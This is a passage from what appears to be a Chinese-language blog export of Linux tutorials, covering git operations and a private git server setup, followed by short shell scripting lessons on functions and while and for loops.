仓库删除 2.txt 了 7.创建远程仓库（github）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先到 https://github.com/ 注册一个账号，创建自己的git，点repositories 再点new &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;名字自定义，比如叫studygit 选择public 点 create repository &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加key： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;右上角点自己头像，选择settings，左侧选择SSH and GPG keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;填写好标题，key 在自己主机上创建，命令 ssh-keygen 12345678910111213141516171819202122[root@localhost gitroot]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): Created directory '/root/.ssh'.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:1f:5f:50:04:2b:80:16:16:e1:9a:a8:59:8c:0a:83:f4 root@localhostThe key's randomart image is:+--[ RSA 2048]----+| ==. .oo || oo . o | | . .. . o ||oo.. o . . ||= +Eo S . . ||o= . o . ||+ . . || || |+-----------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;右上角点New SSH key，把linux机器上的 /root/.ssh/id_rsa.pub内容粘贴到这里 12[root@localhost gitroot]# cat /root/.ssh/id_rsa.pubssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAmTutzYNSxeZNJmHZXtczs8UbfvPZAkKF/Kwj4f8rlD5IG0Mml+euYjgzb2ppQzvh/sxqFJOKBvM9MhQ5MRc2t4eLm1U11FLyxLLJh6Kdtc6do8lWRJLJFOomkky6DQ4ISN8RinW6GMaT22H41xQ4LozIoA2EbYKELsno6MxbFqfwJlwSgv6WB3oBwDWYaY6nf7c04K2jH/xJwxLD8OyO+SzI15JdQBuZrgAXIvh5sQwwX6spKBKqyeYhTOGXZkkI8FSiY90ZMJrsxwZvbZVMNrpvFnXFN5f8ZHeVM33pTpT05EMLt+FrHixuccP8EJjq4efcwQQcrZJoFJYJZSy5vQ== root@localhost &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把本地仓库推送到远程仓库，命令 12git remote add origin git@github.com:hcldirgit/studygit.gitgit push -u origin master 123456789101112131415161718192021222324[root@localhost home]# mkdir studygit[root@localhost home]# cd studygit[root@localhost studygit]# echo "# studygit" &gt;&gt; README.md[root@localhost studygit]# git init itialized empty Git repository in /home/studygit/.git/[root@localhost studygit]# git add README.md[root@localhost studygit]# git commit -m "first commit"[master (root-commit) f3cba66] first commit 1 files changed, 1 insertions(+), 0 deletions(-) create mode 100644 README.md[root@localhost studygit]# git remote add origin git@github.com:hcldirgit/studygit.git[root@localhost studygit]# git push -u origin master The authenticity of host 'github.com (192.30.253.112)' can't be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'github.com,192.30.253.112' (RSA) to the list of known hosts.Counting objects: 6, done.Delta compression using up to 4 threads.Compressing objects: 100% (4/4), done.Writing objects: 100% (6/6), 3.12 KiB, done.Total 6 (delta 0), reused 0 (delta 0)To git@github.com:hcldirgit/studygit.git * [new branch] master -&gt; masterBranch master set up to track remote branch master from origin. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下一次再推送，就可以直接 git push 8.克隆远程仓库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 github 上想把别人的仓库克隆下来 12345678910[root@localhost studygit]# cd /home/[root@localhost home]# git clone git@github.com:aminglinux/lanmp.gitInitialized empty Git repository in /home/lanmp/.git/Warning: Permanently added the RSA host key for IP address '192.30.253.113' to the list of known hosts.remote: Counting objects: 26, done.remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26Receiving objects: 100% (26/26), 5.46 KiB, done.Resolving deltas: 100% (4/4), done.[root@localhost home]# lsgitroot lanmp studygit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它提示，会在当前目录下初始化一个仓库，并创建一个.git的目录 1Initialized empty Git repository in /home/lanmp/.git/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;完成后可以看到一个lanmp 的目录 12345678910[root@localhost home]# lsgitroot lanmp studygit[root@localhost home]# cd lanmp[root@localhost lanmp]# lslanmp.sh README.md[root@localhost lanmp]# cat README.md# lanmplamp/lnmp 一键安装脚本author: amingversion: 0.2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑修改后，使用 git push 再推送到远程服务端。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：如果是克隆的别人的 git 仓库，则无法推送，因为别人没有加我的 key 。 9.使用分支&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看分支，命令 git branch 12[root@localhost studygit]# git branch* master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建分支，命令 git branch 分支名 1[root@localhost studygit]# git branch yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换到创建分之下，git checkout 分支名 12[root@localhost studygit]# git checkout yanyiSwitched to branch 'yanyi' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在新分支下，创建文件并提交 123456[root@localhost studygit]# echo "234qw34\qwerqwer" &gt; 2.txt[root@localhost studygit]# git add 2.txt[root@localhost studygit]# git commit -m "add new 2.txt"[yanyi acbc9ea] add new 2.txt 1 files changed, 1 insertions(+), 0 deletions(-) create mode 100644 2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换到 master 分支，查看 1234[root@localhost studygit]# git checkout masterSwitched to branch 'master'[root@localhost studygit]# lslanmp.sh README.md 10.分支的合并和删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把 yanyi 分支合并到 master ，命令 git merge yanyi 。注意必须先切换到 master 分支下执行命令 12345678910[root@localhost studygit]# git checkout masterSwitched to branch 'master'[root@localhost studygit]# git merge yanyi Updating 23545a4..acbc9eaFast-forward 2.txt | 1 + 1 files changed, 1 insertions(+), 0 deletions(-) create mode 100644 2.txt[root@localhost studygit]# ls2.txt lanmp.sh README.md &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果master分支和yanyi分支都对2.txt进行了编辑，当合并时会提示冲突，需要先解决冲突才可以继续合并。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决冲突的方法是在master分支下，编辑2.txt，改为yanyi分支里面2.txt的内容。 然后提交2.txt，再合并yanyi分支。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是这样有一个问题，万一master分支更改的内容是我们想要的呢？ 我们可以编辑2.txt内容，改为我们想要的，然后提交。切换到yanyi分支，然后合并master分支到yanyi分支即可。（倒着合并）合并分支有一个原则，那就是要把最新的分支合并到旧的分支。也就是说merge后面跟的分支名字一定是最新的分支。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除分支，命令 git branch -d 分支名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果分支没有合并，删除之前会提示。不合并，强制删除，命令 git branch -D 分支名 11.分支使用原则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于分支的应用，建议大家以这样的原则来： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master分支是非常重要的，线上发布代码用这个分支，平时我们开发代码不要在这个分支上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建一个dev分支，专门用作开发，只有当发布到线上之前，才会把dev分支合并到master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开发人员应该在dev的基础上再分支成个人分支，个人分支（在自己pc上）里面开发代码，然后合并到dev分支 12.git stash 保留现场&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你正在进行项目中某一部分的工作，里面的东西处于一个比较杂乱的状态，而你想转到其他分支上进行一些工作。问题是，你不想提交进行了一半的工作，否则以后你无法回到这个工作点。解决这个问题的办法就是git stash命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如我们在 yanyi 分支，编辑了一个新的文件3.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候我们需要到其他分支去修复一个bug，所以需要先git add 3.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后 git stash 保存一下现场 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再切换到另外分支去修复bug，修复完bug后，再回到 yanyi 分支 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git stash list 可以看到我们保存过的现场 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 git stash apply 恢复现场 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以指定stash： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git stash apply stash@{0} 123456789101112131415161718[root@localhost studygit]# echo "wqerqwer\asdasg\q1234234" &gt; 3.txt[root@localhost studygit]# ls2.txt 3.txt lanmp.sh README.md[root@localhost studygit]# git add 3.txt[root@localhost studygit]# git stashSaved working directory and index state WIP on yanyi: acbc9ea add new 2.txtHEAD is now at acbc9ea add new 2.txt[root@localhost studygit]# git stash liststash@&#123;0&#125;: WIP on yanyi: acbc9ea add new 2.txt[root@localhost studygit]# git stash apply stash@&#123;0&#125;# On branch yanyi# Changes to be committed:# (use "git reset HEAD &lt;file&gt;..." to unstage)## new file: 3.txt#[root@localhost studygit]# ls2.txt 3.txt lanmp.sh README.md 13.远程分支管理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看远程库信息，使用git remote -v 本地新建的分支如果不推送到远程，对其他人就是不可见的 123[root@localhost studygit]# git remote -vorigin git@github.com:hcldirgit/studygit.git (fetch)origin git@github.com:hcldirgit/studygit.git (push) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看远程分支 git ls-remote origin 12345[root@localhost studygit]# git ls-remote originacbc9ea125b527e9f3ab30dcf5f5b3e415c760e1 HEADacbc9ea125b527e9f3ab30dcf5f5b3e415c760e1 refs/heads/devacbc9ea125b527e9f3ab30dcf5f5b3e415c760e1 refs/heads/masteracbc9ea125b527e9f3ab30dcf5f5b3e415c760e1 refs/heads/yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交 12[root@localhost studygit]# git push origin yanyiEverything up-to-date 12[root@localhost studygit]# git pullAlready up-to-date. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致 1234567891011121314151617181920212223242526[root@localhost home]# rm -rf studygit[root@localhost home]# git clone git@github.com:hcldirgit/studygit.gitInitialized empty Git repository in /home/studygit/.git/remote: Counting objects: 9, done.remote: Compressing objects: 100% (6/6), done.remote: Total 9 (delta 0), reused 9 (delta 0), pack-reused 0Receiving objects: 100% (9/9), done.[root@localhost home]# cd studygit[root@localhost studygit]# ls2.txt lanmp.sh README.md[root@localhost studygit]# git branch* master[root@localhost studygit]# git checkout -b dev origin/devBranch dev set up to track remote branch dev from origin.Switched to a new branch 'dev'[root@localhost studygit]# git checkout -b yanyi origin/yanyiBranch yanyi set up to track remote branch yanyi from origin.Switched to a new branch 'yanyi'[root@localhost studygit]# git checkout -b yi origin/yi Branch yi set up to track remote branch yi from origin.Switched to a new branch 'yi'[root@localhost studygit]# git branch dev master yanyi* yi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。 14.标签管理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;标签类似于快照功能，我们可以给版本库打一个标签，记录某个时刻库的状态。我们可以随时恢复到该状态。 git checkout master 先切到master分支上 git tag v1.0 给master打一个标签v1.0 git tag 可以查看所有的标签 1234567891011121314151617[root@localhost studygit]# git tag v1.0[root@localhost studygit]# git tagv1.0[root@localhost studygit]# git show v1.0commit acbc9ea125b527e9f3ab30dcf5f5b3e415c760e1Author: yanyi &lt;hcldir@qq.com&gt;Date: Mon Jan 9 05:08:10 2017 +0800 add new 2.txt diff --git a/2.txt b/2.txtnew file mode 100644index 0000000..e9af856--- /dev/null+++ b/2.txt@@ -0,0 +1 @@+234qw34\qwerqwer &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tag是针对commit来打标签的，所以可以针对历史的commit来打tag &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 git log –pretty=oneline –abbrev-commit 12345678[root@localhost studygit]# git log --pretty=onelineacbc9ea125b527e9f3ab30dcf5f5b3e415c760e1 add new 2.txt23545a469bcea58ba25718515d1de2c78c9d7235 add lanmp.shf3cba6670b29b8848c8a8ea61777918f097bcfbe first commit[root@localhost studygit]# git log --pretty=oneline --abbrev-commitacbc9ea add new 2.txt23545a4 add lanmp.shf3cba66 first commit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git tag v0.9 23545a4 1234567891011121314151617[root@localhost studygit]# git tag v0.9 23545a4[root@localhost studygit]# git tagv0.9v1.0[root@localhost studygit]# git show v0.9commit 23545a469bcea58ba25718515d1de2c78c9d7235Author: yanyi &lt;hcldir@qq.com&gt;Date: Sun Jan 8 04:13:11 2017 +0800add lanmp.shdiff --git a/lanmp.sh b/lanmp.shnew file mode 100644index 0000000..5a1db53--- /dev/null+++ b/lanmp.sh@@ -0,0 +1,465 @@ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git tag -a v0.8 -m “tag just v1.1 and so on” acbc9ea 可以对标签进行描述 12345678910111213141516171819202122232425[root@localhost studygit]# git tag -a v0.8 -m "tag just v1.1 and so on" acbc9ea[root@localhost studygit]# git tagv0.8v0.9v1.0[root@localhost studygit]# git show v0.8tag v0.8Tagger: yanyi &lt;hcldir@qq.com&gt;Date: Mon Jan 9 19:32:17 2017 +0800 tag just v1.1 and so on commit acbc9ea125b527e9f3ab30dcf5f5b3e415c760e1Author: yanyi &lt;hcldir@qq.com&gt;Date: Mon Jan 9 05:08:10 2017 +0800 add new 2.txt diff --git a/2.txt b/2.txtnew file mode 100644index 0000000..e9af856--- /dev/null+++ b/2.txt@@ -0,0 +1 @@+234qw34\qwerqwer &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git tag -d v0.8 删除标签 12[root@localhost studygit]# git tag -d v0.8Deleted tag 'v0.8' (was 2321146) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git push origin v1.0 推送指定标签到远程 1234[root@localhost studygit]# git push origin v1.0 Total 0 (delta 0), reused 0 (delta 0)To git@github.com:hcldirgit/studygit.git* [new tag] v1.0 -&gt; v1.0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git push –tag origin 推送所有标签 1234[root@localhost studygit]# git push --tag originTotal 0 (delta 0), reused 0 (delta 0)To git@github.com:hcldirgit/studygit.git * [new tag] v0.9 -&gt; v0.9 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果本地删除了一个标签，远程也想要删除需要这样操作： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git tag v1.0 -d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git push origin :refs/tags/v1.0 12345[root@localhost studygit]# git tag v1.0 -dDeleted tag 'v1.0' (was acbc9ea)[root@localhost studygit]# git push origin :refs/tags/v1.0To git@github.com:hcldirgit/studygit.git- [deleted] v1.0 15.git 别名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git commit 这个命令是不是有点长？ 用别名可以提高我们的工作效率 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git config –global alias.ci commit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git config –global alias.co checkout &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git config –global alias.br branch 1234567891011[root@localhost studygit]# git config --global alias.ci comit[root@localhost studygit]# git config --global alias.br branch[root@localhost studygit]# git config --global alias.co checkout[root@localhost studygit]# git config --global alias.lg "log --pretty=oneline"[root@localhost studygit]# git br dev* master yanyi yi[root@localhost studygit]# git co devSwitched to branch 'dev' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;别名所在文件 /root/.gitconfig 也可以直接编辑该文件 123456789[root@localhost studygit]# cat /root/.gitconfig[user] name = yanyi email = hcldir@qq.com[alias] ci = comit br = branch co = checkout lg = log --pretty=oneline &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看git别名使用命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git config –list |grep alias 12345[root@localhost studygit]# git config --list |grep aliasalias.ci=comitalias.br=branchalias.co=checkoutalias.lg=log --pretty=oneline &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git config –list 可以详细查看 123456789101112131415161718192021[root@localhost studygit]# git config --listuser.name=yanyiuser.email=hcldir@qq.comalias.ci=comitalias.br=branchalias.co=checkoutalias.lg=log --pretty=onelinecore.repositoryformatversion=0core.filemode=truecore.bare=falsecore.logallrefupdates=trueremote.origin.fetch=+refs/heads/*:refs/remotes/origin/*remote.origin.url=git@github.com:hcldirgit/studygit.gitbranch.master.remote=originbranch.master.merge=refs/heads/masterbranch.dev.remote=originbranch.dev.merge=refs/heads/devbranch.yanyi.remote=originbranch.yanyi.merge=refs/heads/yanyibranch.yi.remote=originbranch.yi.merge=refs/heads/yi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查询log小技巧： 1git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit" 12345[root@localhost studygit]# git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit"[root@localhost studygit]# git lg* acbc9ea - (HEAD, origin/yi, origin/yanyi, origin/master, origin/dev, origin/HEAD, yi, yanyi, master, dev) add new 2.txt (15 hours ago) &lt;yanyi&gt;* 23545a4 - (v0.9) add lanmp.sh (2 days ago) &lt;yanyi&gt;* f3cba66 - first commit (2 days ago) &lt;yanyi&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用以后，git 就会有颜色 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;取消别名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git config –global –unset alias.br 1234567[root@localhost studygit]# git config --global --unset alias.br[root@localhost studygit]# git brgit: 'br' is not a git command. See 'git --help'.Did you mean this? var` 16.搭建 git 服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;github 毕竟是公开的，而私有仓库又得花钱买。所以我们可以想办法搭建一个私有的，只自己公司使用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum install git安装git 12[root@gitserver ~]# yum install -y epel-release[root@gitserver ~]# yum install -y git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;useradd -s /usr/bin/git-shell git 添加git用户，并且设置shell为/usr/bin/git-shell,目的是为了不让git用户远程登陆 12[root@gitserver ~]# useradd -s /usr/bin/git-shell git[root@gitserver ~]# cd /home/git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 authorized_keys 文件，并更改属主、属组和权限，用来存客户端机器上的公钥 123[root@gitserver git]# mkdir .ssh[root@gitserver git]# touch .ssh/authorized_keys[root@gitserver git]# vim .ssh/authorized_keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;公钥内容在，客户端 /root/.shh/id_rsa.pub 1[root@localhost studygit]# cat /root/.ssh/id_rsa.pub &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置权限 123[root@gitserver git]# chown -R git .ssh[root@gitserver git]# chmod 700 .ssh[root@gitserver git]# chmod 600 .ssh/authorized_keys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端查看能否连接 1234567[root@localhost studygit]# ssh git@192.168.0.91The authenticity of host '192.168.0.91 (192.168.0.91)' can't be established.RSA key fingerprint is 38:82:75:f9:11:a3:56:b4:00:ce:46:75:65:7c:5c:9b.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '192.168.0.91' (RSA) to the list of known hosts.fatal: What do you think I am? A shell?Connection to 192.168.0.91 closed. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就说明可以连接 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主机设置 1[root@gitserver git]# usermod -s /bin/bash git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端连接 12345[root@localhost studygit]# ssh git@192.168.0.91Last login: Mon Jan 9 21:53:51 2017 from 192.168.0.92[git@gitserver ~]$ logoutConnection to 192.168.0.91 closed.[root@localhost studygit]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样检测客户端公钥能登录主机，检测完成主机改回设置 1[root@gitserver git]# usermod -s /usr/bin/git-shell git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样客户端就不能登录主机 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定好存储git仓库的目录，比如 /data/gitroot 123456789[root@gitserver git]# mkdir -p /data/gitroot[root@gitserver git]# cd /data/gitroot[root@gitserver gitroot]# git init --bare sample.gitInitialized empty Git repository in /data/gitroot/sample.git/[root@gitserver gitroot]# ls -la总用量 12drwxr-xr-x 3 root root 4096 1月 9 22:16 .drwxr-xr-x 3 root root 4096 1月 9 22:16 ..drwxr-xr-x 7 root root 4096 1月 9 22:16 sample.git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：git init –bare sample.git 会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改权限 1[root@gitserver gitroot]# chown -R git.git sample.git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在客户端上（自己pc）克隆远程仓库 12345[root@localhost home]# git clone git@192.168.0.91:/data/gitroot/sample.gitInitialized empty Git repository in /home/sample/.git/warning: You appear to have cloned an empty repository.[root@localhost home]# lsgitroot lanmp sample studygit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端操作，推送到服务器 1234567891011121314[root@localhost sample]# ls[root@localhost sample]# echo "1234\abcd\5678\efgh" &gt; 1.txt[root@localhost sample]# git add 1.txt[root@localhost sample]# git commit -m "add new 1.txt"[master (root-commit) a86f429] add new 1.txt 1 files changed, 1 insertions(+), 0 deletions(-) create mode 100644 1.txt[root@localhost sample]# git push -u origin masterCounting objects: 3, done.Writing objects: 100% (3/3), 224 bytes, done.Total 3 (delta 0), reused 0 (delta 0)To git@192.168.0.91:/data/gitroot/sample.git * [new branch] master -&gt; masterBranch master set up to track remote branch master from origin. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上操作是在git服务器上做的，平时git服务器是不需要开发人员登录修改代码的，它仅仅是充当着一个服务器的角色，就像github一样，平时操作都是在我们自己的pc上做的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要把客户端上的公钥放到git服务器上/home/git/.ssh/authorized_keys文件里 git clone git@ip:/data/gitroot/sample.git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时就可以在当前目录下生成一个sample的目录，这个就是我们克隆的远程仓库了。进入到这里面，可以开发一些代码，然后push到远程。]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 函数]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F16.%20shell%20%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[shell 函数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;函数就是把一段代码整理到了一个小单元中，并给这个小单元起一个名字，当用到这段代码时，直接调用这个小单元的名字即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式： 123function funame() &#123; command｝ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;函数必须要放在最前面。 1[root@192 sbin]# vim func1.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345#!/bin/bashinput() &#123;echo $1&#125;input aaa &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的脚本其实就是一个非常简单的函数，函数名字为 input ，它的作用就是输出参数 1 的内容。 1[root@192 sbin]# sh func1.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再来看加法运算的函数： 1[root@192 sbin]# vim func2.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入内容： 123456#!/bin/bashsum() &#123;s=$[$1+$2]echo $s&#125;sum 1 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：sum 为一个加法运算的函数， $1 和 $2 为第一个和第二个参数， sum 1 2 ，其实就是 1+2 ，最后 echo 出来它们的和。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是一个稍微复杂的函数: 1[root@192 sbin]# vim func3.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567#!/bin/baship() &#123;ifconfig |grep -A1 "$1"|tail -l |awk '&#123;print $2&#125;'|awk -F ':' '&#123;print $2&#125;'&#125;read -p "Please input the eth name:" emyip=`ip $e`echo "$e address is $myip" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：ip 函数其实就是通过 grep 和 awk 把网卡的 ip 给截取出来，只不过这个网卡的名字是让用户子机动手输入的。 1[root@192 sbin]# sh func3.sh]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[while 循环]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F14.%20while%20%E5%BE%AA%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[while 循环&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;while 循环常常用来写死循环的脚本，用于监控某项服务。 1[root@192 sbin]# vim while.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567#!/bin/basha=5while [ $a -ge 1 ]do echo $a a=$[$a-1]done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;while 循环格式也很简单： 123while 条件：do commanddone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例脚本的执行结果为： 1[root@192 sbin]# sh while.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外可以把循环条件拿一个冒号代替，这样可以做到死循环，监控脚本常常这样写： 1234while :;do command sleep 3done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面用 while 死循环，来写一个判断系统负载的脚本。 1[root@192 sbin]# vim 6.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456789#!/bin/bashwhile :;do load=`uptime |awk '&#123;print $(NF-2)&#125;'|cut -d. -f1` if [ $load -gt 10 ] then echo "system load is high."|mail -s "system load" 89429541@qq.com fi sleep 10done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：uptime 命令是用来查看系统负载的，用 awk 截取倒数第三段，也即是平均 1 分钟的系统负载，然后只取整数部分。如果系统负载高于 10 则发邮件告警。每隔 10 秒检查一次。但是如果系统负载一直高于 10，那么将会出现每隔 10 秒发一次邮件的窘境。]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[for 循环]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F13.%20for%20%E5%BE%AA%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[for 循环&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell 脚本中也算是一门简易的编程语言了，当然循环是不能缺少的。常用到的循环有 for 循环和 while 循环。for 循环的结构是在日常运维中使用最频繁的循环结构。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个简单的 for 循环脚本： 1[root@192 sbin]# vim for.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345#!/bin/bashfor i in `seq 1 5`do echo $idone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本中的 seq 1 5 表示从 1 到 5 的一个序列。可以直接运行这个命令试一下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本执行结果： 1[root@192 sbin]# sh for.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过这个脚本就可以看到 for 循环的基本结构： 123for 变量名 in 循环的条件；do commanddone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的“循环的条件”可以写成一组字符串或者数字（用 1 个或者多个空格隔开），也可以是一条命令的执行结果： 1[root@192 sbin]# for i in 1 2 3 a b;do echo $i;done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以写引用系统命令的执行结果，就像那个 seq 1 5 但是需要用反引号括起来： 1[root@192 sbin]# for file in `ls`;do echo $file;done]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell中的select用法]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F12.%20shell%E4%B8%AD%E7%9A%84select%E7%94%A8%E6%B3%95%2F</url>
